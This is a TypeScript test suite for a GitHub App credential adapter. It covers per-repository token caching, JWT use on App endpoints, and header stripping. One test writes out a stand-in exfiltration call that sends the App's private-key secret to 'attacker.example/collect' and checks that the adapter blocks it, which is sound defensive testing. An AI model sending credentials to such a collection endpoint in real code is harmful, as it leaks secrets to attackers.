import { describe, expect, test } from "bun:test";
import { generateKeyPairSync } from "node:crypto";

import { createGithubAppCredentialFetch, toRequest } from "./github-app-credential-adapter";

const API = "https://api.github.com";

function tokenExpiry(): string {
  return new Date(Date.now() + 60 * 60_000).toISOString();
}

function noContent(): Response {
  return new Response(null, { status: 204 });
}

function appSecret(): string {
  const { privateKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
  return JSON.stringify({
    appId: "123",
    privateKey: privateKey.export({ type: "pkcs8", format: "pem" }).toString(),
  });
}

describe("GitHub App credential adapter", () => {
  test("discovers and caches installation tokens separately for each target repository", async () => {
    const secret = appSecret();
    const calls: string[] = [];
    async function github(input: string | URL | Request, init?: RequestInit): Promise<Response> {
      const request = toRequest(input, init);
      const path = new URL(request.url).pathname;
      calls.push(`${request.method} ${path}`);
      if (path === "/repos/acme/one/installation") return Response.json({ id: 101 });
      if (path === "/repos/acme/two/installation") return Response.json({ id: 202 });
      if (path === "/app/installations/101/access_tokens") return Response.json({ token: "token-one", expires_at: tokenExpiry() });
      if (path === "/app/installations/202/access_tokens") return Response.json({ token: "token-two", expires_at: tokenExpiry() });
      if (path === "/repos/acme/one/pulls") {
        expect(request.headers.get("authorization")).toBe("Bearer token-one");
        return Response.json([]);
      }
      if (path === "/repos/acme/two/pulls") {
        expect(request.headers.get("authorization")).toBe("Bearer token-two");
        return Response.json([]);
      }
      throw new Error(`unexpected request ${request.method} ${path}`);
    }
    const adapted = createGithubAppCredentialFetch({ apiOrigin: API, fetch: github });
    const headers = { authorization: `Bearer ${secret}` };

    await adapted(`${API}/repos/acme/one/pulls`, { headers });
    await adapted(`${API}/repos/acme/two/pulls`, { headers });
    await adapted(`${API}/repos/acme/one/pulls`, { headers });

    expect(calls.filter((call) => call.includes("/app/installations/101/access_tokens"))).toHaveLength(1);
    expect(calls.filter((call) => call.includes("/app/installations/202/access_tokens"))).toHaveLength(1);
  });

  test("never sends GitHub App JSON or its private key to a non-GitHub origin", async () => {
    const secret = appSecret();
    const observed: string[] = [];
    async function observe(input: string | URL | Request, init?: RequestInit): Promise<Response> {
      const request = toRequest(input, init);
      observed.push(`${request.url}\n${request.headers.get("authorization") ?? ""}`);
      return noContent();
    }
    const adapted = createGithubAppCredentialFetch({ apiOrigin: API, fetch: observe });

    await expect(adapted("https://attacker.example/collect", {
      headers: { authorization: `Bearer ${secret}` },
    })).rejects.toThrow("non-GitHub origin");
    expect(observed).toEqual([]);
    expect(observed.join("\n")).not.toContain(secret);
    expect(observed.join("\n")).not.toContain("PRIVATE KEY");
  });

  test("uses App JWT for App endpoints and strips the internal installation selector", async () => {
    const secret = appSecret();
    const seen: Array<{ path: string; authorization: string; selector: string | null }> = [];
    async function github(input: string | URL | Request, init?: RequestInit): Promise<Response> {
      const request = toRequest(input, init);
      const path = new URL(request.url).pathname;
      seen.push({ path, authorization: request.headers.get("authorization") ?? "", selector: request.headers.get("x-corbits-github-installation-id") });
      if (path === "/app") return Response.json({ slug: "corbits" });
      if (path === "/app/installations/42/access_tokens") return Response.json({ token: "installation-token", expires_at: tokenExpiry() });
      if (path === "/installation/repositories") return Response.json({ repositories: [] });
      throw new Error(`unexpected ${path}`);
    }
    const adapted = createGithubAppCredentialFetch({ apiOrigin: API, fetch: github });
    const authorization = `Bearer ${secret}`;
    await adapted(`${API}/app`, { headers: { authorization } });
    await adapted(`${API}/installation/repositories`, { headers: { authorization, "x-corbits-github-installation-id": "42" } });
    expect(seen[0]?.authorization).toMatch(/^Bearer eyJ/);
    expect(seen.at(-1)).toMatchObject({ path: "/installation/repositories", authorization: "Bearer installation-token", selector: null });
    expect(seen.some((call) => call.authorization.includes("privateKey"))).toBe(false);
  });
});
